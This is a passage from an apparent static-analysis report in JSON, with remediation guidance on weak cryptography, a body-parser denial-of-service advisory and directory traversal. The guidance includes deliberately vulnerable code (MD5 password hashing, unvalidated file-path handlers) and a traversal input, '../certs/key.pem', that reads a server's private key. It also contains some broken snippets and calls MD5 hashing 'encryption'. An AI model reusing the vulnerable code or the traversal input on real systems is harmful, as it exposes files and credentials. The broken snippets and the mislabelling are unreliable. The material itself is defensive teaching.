`DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following Node.js function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```javascript\nconst crypto = require('crypto')\n\nfunction encryptPassword(password) {\n  return crypto.createHash('md5').update('password).digest(\"hex\")\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Python]\n\nConsider the following Python function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```python\nimport hashlib\n\ndef encrypt_password(password):\n  return hashlib.md5(password.encode('utf-8')).hexdigest()\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Scala]\n\nConsider the following Scala function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```scala\nimport java.security.MessageDigest\n\ndef encryptPassword(password: String) = {\n    MessageDigest.getInstance(\"MD5\").digest(password.getBytes).map(\"%02X\" format _).mkString\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[Go]\n\nConsider the following Go function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```go\nimport (\n  \"crypto/md5\"\n  \"encoding/hex\"\n)\n\nfunc HashPassword(password string) string {\n   hash := md5.Sum([]byte(password))\n   return hex.EncodeToString(hash[:])\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[PHP]\n\n## Encryption Vulnerabilities in PHP\n\nIn PHP, it's crucial to use modern and secure encryption methods. Relying on outdated or weak encryption functions can expose sensitive data to attackers. Consider the use of the `mcrypt` extension, which has been deprecated since PHP 7.1.0 due to its aging algorithms and its lack of support for modern cryptography:\n\n```php\nfunction encryptData($data, $key) {\n    $ivSize = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);\n    $iv = mcrypt_create_iv($ivSize, MCRYPT_RAND);\n    return mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);\n}\n```\n\nUsing the `mcrypt` functions in modern applications is not recommended. They utilize older algorithms, are not maintained, and might contain vulnerabilities.\n\n## Mitigation\n\n1. **Use Modern Encryption Libraries**: PHP has the `openssl` extension, which provides a rich set of low-level cryptographic operations. It unfortunately does not come with good high-level abstractions for the most common cryptographic needs.\n\n```php\nfunction encryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    $ivlen = openssl_cipher_iv_length($cipher=$cipher);\n    $iv = random_bytes($ivlen);\n    $ciphertext = openssl_encrypt($data, $cipher, $key, $options=0, $iv, $tag);\n    return json_encode([base64_encode($iv), base64_encode($tag), base64_encode($ciphertext)]);\n}\nfunction decryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    [$iv, $tag, $ciphertext] = json_decode($data);\n    return openssl_decrypt(base64_decode($ciphertext), $cipher, $key, $options=0, base64_decode($iv), base64_decode($tag));\n}\n```\n\n2. **Avoid Deprecated Encryption Extensions**: Steer clear of deprecated extensions like `mcrypt`. Instead, use more modern extensions like `openssl`.\n\n3. **Regularly Update and Review**: Cryptography standards evolve over time. Ensure that your encryption methods are updated regularly to align with best practices.\n\n:::\n\n::::\n\n## Encoding is Not Encryption\n\nEncodings like Base64 are a common method of transforming binary data to text before transmission. Anybody can decode \nBase64 text, however - do not depend on encoding methods to hide secrets from attackers!\n\n## Don't Invent Your Own Encryption Algorithms\n\nAvoid the temptation to roll your own encryption algorithm. Cryptography is hard, and designing your own cryptographic \nschemes when well-studied encryption algorithms are freely available is asking for trouble.\n\n## Symmetric vs Asymmetric Encryption Algorithms\n\nAn encryption algorithm that uses the same key to encrypt and decrypt data is called a *symmetric algorithm*. An \n*asymmetric algorithm* uses different keys to encrypt and decrypt data, and has the advantage that the encryption key\ncan be made public, allowing anyone to securely encrypt data in a way that only the holder of the decryption key can\nread. For this reason, asymmetric algorithms are commonly called **public-key** algorithms. However, common asymmetric\nciphers can be broken when they are used directly with arbitrary untrusted inputs. Often, a hybrid scheme combining\nboth symmetric and asymmetric encryption needs to be used to avoid the problems that each scheme would have on its own.\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**",
                                "text": "Usage of a broken cryptographic algorithm was identified.\n\n# Encryption Vulnerabilities\n\nEncryption powers the modern internet, allowing secure storage of data and transmission of secrets across a network\nin such a way they cannot be inspected or tampered with by a third party. It is important that you use *strong\nencryption* algorithms when securing data in this way, or an attacker will be able to backwards engineer confidential\ninformation if they possess enough computing power.\n\n## Encryption Algorithms\n\nEncryption algorithms are designed to encode the contents of a string or binary object in such away that an attacker\nwho does not possession the decryption key will not be able to decipher the contents. *Cryptography* - the study of \nencryption algorithms - is a complex field, and new encryption algorithms are invented by mathematicians frequently.\n\nAs computing power gets cheaper, it becomes easier for an attacker to use brute-force to decrypt the contents of \nencrypted data. For this reason, it's important to use modern encryption algorithms in your code, so your secrets\nremain safe.\n\n::::tabs\n\n:::tab[Java]\n\nConsider the following Java function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```java\npublic static String hashPassword(String password) throws java.security.NoSuchAlgorithmException\n{\n   java.security.MessageDigest digest = java.security.MessageDigest.getInstance(\"MD5\");\n   byte[] bytes = md.digest(password.getBytes());\n   \n   return org.apache.commons.codec.binary.Hex.encodeHexString(bytes);\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[C#]\n\nConsider the following C# function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```csharp\n// An example of weak password hash. Don't use MD5 to encrypt passwords!\npublic static string HashPassword(string password)\n{\n    using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())\n    {\n        byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(password);\n        byte[] hashBytes  = md5.ComputeHash(inputBytes);\n\n        // Convert the byte array to hexadecimal string.\n        StringBuilder sb = new StringBuilder();\n        for (int i = 0; i < hashBytes.Length; i++)\n        {\n            sb.Append(hashBytes[i].ToString(\"X2\"));\n        }\n        \n        return sb.ToString();\n    }\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[JavaScript]\n\nConsider the following Node.js function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```javascript\nconst crypto = require('crypto')\n\nfunction encryptPassword(password) {\n  return crypto.createHash('md5').update('password).digest(\"hex\")\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Python]\n\nConsider the following Python function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```python\nimport hashlib\n\ndef encrypt_password(password):\n  return hashlib.md5(password.encode('utf-8')).hexdigest()\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n\n:::\n\n:::tab[Scala]\n\nConsider the following Scala function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```scala\nimport java.security.MessageDigest\n\ndef encryptPassword(password: String) = {\n    MessageDigest.getInstance(\"MD5\").digest(password.getBytes).map(\"%02X\" format _).mkString\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[Go]\n\nConsider the following Go function, that uses a weak encryption algorithm (MD5) to encrypt passwords. Since the\nalgorithm does not strongly encrypt the data - it is computationally cheap to calculate the MD5 value - an attacker can\nquickly calculate the MD5 values of commonly used passwords, compare them to the encrypted value, and backwards engineer\nthe passwords:\n\n```go\nimport (\n  \"crypto/md5\"\n  \"encoding/hex\"\n)\n\nfunc HashPassword(password string) string {\n   hash := md5.Sum([]byte(password))\n   return hex.EncodeToString(hash[:])\n}\n```\n\nHere are some algorithms to avoid, since they provide weak encryption:\n\n* `DES/CBC/PKCS5Padding`\n* `DES/CBC/PKCS5PADDING`\n* `DES/ECB/PKCS5Padding`\n* `AES/ECB/NoPadding`\n\n:::\n\n:::tab[PHP]\n\n## Encryption Vulnerabilities in PHP\n\nIn PHP, it's crucial to use modern and secure encryption methods. Relying on outdated or weak encryption functions can expose sensitive data to attackers. Consider the use of the `mcrypt` extension, which has been deprecated since PHP 7.1.0 due to its aging algorithms and its lack of support for modern cryptography:\n\n```php\nfunction encryptData($data, $key) {\n    $ivSize = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_CBC);\n    $iv = mcrypt_create_iv($ivSize, MCRYPT_RAND);\n    return mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);\n}\n```\n\nUsing the `mcrypt` functions in modern applications is not recommended. They utilize older algorithms, are not maintained, and might contain vulnerabilities.\n\n## Mitigation\n\n1. **Use Modern Encryption Libraries**: PHP has the `openssl` extension, which provides a rich set of low-level cryptographic operations. It unfortunately does not come with good high-level abstractions for the most common cryptographic needs.\n\n```php\nfunction encryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    $ivlen = openssl_cipher_iv_length($cipher=$cipher);\n    $iv = random_bytes($ivlen);\n    $ciphertext = openssl_encrypt($data, $cipher, $key, $options=0, $iv, $tag);\n    return json_encode([base64_encode($iv), base64_encode($tag), base64_encode($ciphertext)]);\n}\nfunction decryptDataSymmetric($data, $key) {\n    $cipher = \"aes-128-gcm\";\n    [$iv, $tag, $ciphertext] = json_decode($data);\n    return openssl_decrypt(base64_decode($ciphertext), $cipher, $key, $options=0, base64_decode($iv), base64_decode($tag));\n}\n```\n\n2. **Avoid Deprecated Encryption Extensions**: Steer clear of deprecated extensions like `mcrypt`. Instead, use more modern extensions like `openssl`.\n\n3. **Regularly Update and Review**: Cryptography standards evolve over time. Ensure that your encryption methods are updated regularly to align with best practices.\n\n:::\n\n::::\n\n## Encoding is Not Encryption\n\nEncodings like Base64 are a common method of transforming binary data to text before transmission. Anybody can decode \nBase64 text, however - do not depend on encoding methods to hide secrets from attackers!\n\n## Don't Invent Your Own Encryption Algorithms\n\nAvoid the temptation to roll your own encryption algorithm. Cryptography is hard, and designing your own cryptographic \nschemes when well-studied encryption algorithms are freely available is asking for trouble.\n\n## Symmetric vs Asymmetric Encryption Algorithms\n\nAn encryption algorithm that uses the same key to encrypt and decrypt data is called a *symmetric algorithm*. An \n*asymmetric algorithm* uses different keys to encrypt and decrypt data, and has the advantage that the encryption key\ncan be made public, allowing anyone to securely encrypt data in a way that only the holder of the decryption key can\nread. For this reason, asymmetric algorithms are commonly called **public-key** algorithms. However, common asymmetric\nciphers can be broken when they are used directly with arbitrary untrusted inputs. Often, a hybrid scheme combining\nboth symmetric and asymmetric encryption needs to be used to avoid the problems that each scheme would have on its own.\n\n## Additional information\n\n**[CWE-327](https://cwe.mitre.org/data/definitions/327.html)**\n\n**[OWASP-A6](https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/327.html",
                            "id": "weak-crypto-des/bbc5dfa20c1b2b447cc51fe9a3d98566",
                            "name": "Weak Cipher: Use Of A Broken Cryptographic Algorithm In Login.js:encryptdata",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "9",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 9",
                                    "CWE 327",
                                    "Cryptography",
                                    "OWASP 2021 a02-cryptographic-failures",
                                    "OWASP a02-2021-cryptographic-failures",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Weak Cipher"
                                ]
                            },
                            "shortDescription": {
                                "text": "Weak Cipher: Use of a Broken Cryptographic Algorithm in Login.js:encryptData"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "body-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service."
                            },
                            "help": {
                                "markdown": "body-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service.",
                                "text": "body-parser <1.20.3 is vulnerable to denial of service when url encoding is enabled. A malicious actor using a specially crafted payload could flood the server with a large number of requests, resulting in denial of service."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/405.html",
                            "id": "oss_vuln/573931191d3ac6c6584b230b189d4205",
                            "name": "Pkg:npm/Body-Parser@1.19.0",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "7.5",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2024-45590",
                                    "CVSS 7.5",
                                    "CWE 1035",
                                    "CWE 405",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/body-parser@1.19.0"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "warning",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "HTTP input data is used as part of a file path to read a file on the server without escaping or validation. This indicates a directory traversal vulnerability."
                            },
                            "help": {
                                "markdown": "HTTP input data is used as part of a file path to read a file on the server without escaping or validation. This indicates a directory traversal vulnerability.\n\n# Directory Traversal\n\n**Directory traversal** vulnerabilities allow attackers to access arbitrary files on your server by manipulating HTTP\nparameters to include relative path syntax. It is important that you treat any parameters used to refer to files\nsecurely, or an attacker will be able to read sensitive data from your file system. Even better, avoid direct references\nto filenames altogether and use opaque identifiers and indirection instead.\n\n::::tabs\n\n:::tab[Java]\n\nPassing file paths in URLs is dangerous. Consider the following Java application that hosts menus for a restaurant:\n\n```java\npublic class UnsafeFileDownloadServlet\n{\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Taking the unfiltered filename from the HTTP request is dangerous -\n         * an attacker can use the \"../\" syntax in a filename to climb out of\n         * the intended directory.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String menuDirectory = \"/var/etc/menus\";\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + fileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + fileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `FilenameUtils.getBaseName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```java\nimport org.apache.commons.io.FilenameUtils;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Removing anything except alphanumeric characters (and periods) will\n         * stop access to arbitrary directories.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String safeFileName  = FilenameUtils.getBaseName(fileName);\n        final String menuDirectory = \"/var/etc/menus\";\n\n\tif (\"\".equals(safeFileName) || \".\".equals(safeFileName) || \"..\".equals(safeFileName)) {\n\t    throw new SystemException(\"refusing to read a special directory name\");\n\t}\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + safeFileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + safeFileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nIn Java web applications you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content in a Jetty web-server:\n\n```xml\n<Configure class=\"org.eclipse.jetty.server.handler.ContextHandler\">\n  <Set name=\"contextPath\">/menus</Set>\n  <Set name=\"handler\">\n    <New class=\"org.eclipse.jetty.server.handler.ResourceHandler\">\n      <Set name=\"resourceBase\">/var/etc/menus</Set>\n      <Set name=\"directoriesListed\">false</Set>\n    </New>\n  </Set>\n</Configure>\n\n```\n\n:::\n\n:::tab[C#]\n\n## Directory Traversal in C#\n\nPassing file paths in URLs is dangerous. Consider the following ASP.NET Core controller method that hosts menus for a \nrestaurant:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult UnsafeFileDownload([FromQuery] string menu)\n    {\n        byte[] fileBytes = System.IO.File.ReadAllBytes(\"Static/menus/\" + menu);\n        return File(fileBytes, \"application/pdf\", menu);\n    }\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `Path.GetFileName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult SaferFileDownload([FromQuery] string menu)\n    {\n        string baseName = System.IO.Path.GetFileName(menu);\n        if (baseName != \"\" && baseName != \".\" && baseName != \"..\") {\n            byte[] fileBytes    = System.IO.File.ReadAllBytes(\"Static/menus/\" + baseName);\n\n            return File(fileBytes, \"application/pdf\", menu);\n        } else {\n            return Forbid();\n        }\n    }\n```\n\nIn most web-servers you can have the server take care of this for you. The following snipped shows how to use the \nASP.NET Core Static File Middleware to safely mount the `/Static/Menus` directory as static content:\n\n```csharp\n  // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.\n  public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n  {\n      if (env.IsDevelopment())\n      {\n          app.UseDeveloperExceptionPage();\n          app.UseMigrationsEndPoint();\n      }\n      else\n      {\n          app.UseExceptionHandler(\"/Home/Error\");\n          app.UseHsts();\n      }\n      \n      app.UseHttpsRedirection();\n      \n      // Mount the standard 'wwwroot' directory so files are accessible over HTTP.\n      app.UseStaticFiles();\n      \n      // Mount the local 'static/menus' directory so files are accessible over HTTP under the '/menus' path.\n      app.UseStaticFiles(new StaticFileOptions\n      {\n          FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"Static/Menus\")),\n          RequestPath = \"/menus\"\n      });\n      \n      app.UseRouting();\n\n      app.UseEndpoints(endpoints =>\n      {\n          endpoints.MapControllerRoute(\n              name: \"default\",\n              pattern: \"{controller=Home}/{action=Index}/{id?}\");\n          endpoints.MapRazorPages();\n      });\n   } \n```\n\n:::\n\n:::tab[JavaScript]\n\n## Directory Traversal in JavaScript\n\nPassing file paths in URLs is dangerous. Consider the following Express application that hosts menus for a restaurant:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu?menu=breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu?menu=lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu?menu=dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\nconst path = require('path')\n\napp.get('/menu', (request, response) => {\n\n  /**\n   * Taking the unfiltered filename from the HTTP request is dangerous -\n   * an attacker can use the \"../\" syntax in a filename to climb out of\n   * the intended directory.\n   */\n  const menuPath = path.resolve('menus/', request.query.menu)\n\n  response.download(menuPath)\n})\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```javascript\napp.get('/menu', (request, response) => {\n\n  /**\n   * Removing anything except alphanumeric characters (excluding the extension) will\n   * stop access to arbitrary directories.\n   */\n  const suppliedFilename = request.query.menu\n  const match            = suppliedFilename.match(/([a-z0-9]+)\\.([a-z]+)/i)\n  const scrubbedFileName = match[1] + '.' + match[2]\n\n  const menuPath = 'menus/' + scrubbedFileName\n\n  response.download(menuPath)\n})\n```\n\nIn Express, you can have the server take care of this for you. The following code mounts the `/menus` directory as\nstatic content safely:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu/breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu/lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu/dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\n// Tell Express that the /menu directory contains static files that should be made\n// available to the browser.\napp.use('/menu', express.static('menus'))\n```\n\n:::\n\n:::tab[Python]\n\n## Directory Traversal in Python\n\nPassing file paths in URLs is dangerous. Consider the following Flask application that hosts menus for a restaurant:\n\n```python\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An insecure static file handler that allows directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  static_directory = os.fspath(app.menu_folder)\n\n  # The construction of the path here is incredibly insecure!\n  # If a path contains the \"..%2F\" pattern, it will be treated as\n  # ../ and a hacker can climb out of the static directory.\n  filename = posixpath.join(static_directory, filename)\n\n  return send_file(filename)\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you can avoid it, it's preferable to not rely on user input for file names: just\nuse a unique name generated on the server-side instead. This could e.g. be a\ndatabase primary key, or a unique token generated with `secrets.token_urlsafe(32)`.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths.\nThe easiest way to achieve that is with functions such as `os.path.basename`.\nHowever, that would still let through special file names `.` and `..`, for which\nwe add special treatment:\n\n```python\nimport os.path\n\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An more secure file handler does not allow directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  safe_filename    = os.path.basename(filename)\n  if safe_filename == '..' or safe_filename == '.':\n    raise Exception(\"path traversal\")\n\n  static_directory = os.fspath(app.menu_folder)\n  filename         = os.path.join(static_directory, safe_filename)\n\n  return send_file(filename)\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \nthe `/var/etc/menus` directory as static content using the Flask web-server:\n\n```python\n@app.route('/menus/<path:path>')\ndef download_menu(path):\n    return send_from_directory('/var/etc/menus', path)\n```\n\n:::\n\n:::tab[Scala]\n\n## Directory Traversal in Scala\n\nPassing file paths in URLs is dangerous. Consider the following Scala application that hosts menus for a restaurant:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${menu.get}\"))\n  }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```scala\ndef getMenu = Action { request =>\n  val menu = request.getQueryString(\"menu\")\n\n  if (menu.isEmpty) {\n    Redirect(\"/menus\")\n  }\n  else {\n    val safeFilename = menu.get.replaceAll(\"[^a-zA-Z0-9\\\\.]\",\"\")\n    Ok.sendFile(new java.io.File(s\"/var/etc/menus/${safeFilename}\"))\n  }\n}\n```\n\nIn most web-servers you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content using the `Assets` controller of the Play framework:\n\n```\nGET /menus/*menu controllers.Assets.at(path=\"/var/etc/menus\", menu)\n```\n\n:::\n\n:::tab[Go]\n\n## Directory Traversal in Go\n\nPassing file paths in URLs is dangerous. Consider the following Go application that hosts menus for a restaurant:\n\n```go\n// An insecure static file handler that allows directory traversal attacks.\nfunc MenuFileHandler(response http.ResponseWriter, request *http.Request) {\n  fileName := request.URL.Query().Get(\"menu\")\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response, file)\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `filepath.Base` that strips any potential directory\ncomponents from a path. That only leaves `.`, `/` and `..` as special cases that could lead to unexpected behavior:\n\n```go\n// A more secure file handler does not allow directory traversal attacks.\nfunc MenuFileHandler0(response http.ResponseWriter, request *http.Request) {\n  fileName := filepath.Base(request.URL.Query().Get(\"menu\"))\n  if fileName == \".\" || fileName == \"/\" || fileName == \"..\" {\n    http.Error(response, \"Forbidden\", http.StatusForbidden)\n    return\n  }\n\n  file, err := os.Open(staticFolder + fileName)\n\n  if err != nil {\n    http.Error(response, \"Error opening file\", http.StatusInternalServerError)\n    return\n  }\n\n  defer file.Close()\n\n  response.Header().Set(\"Content-Type\", \"application/pdf\")\n\n  io.Copy(response,\n```\n\nIn most web-servers you can have the server take care of this for you. The following function safely mounts \na configurable directory as static content using the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", 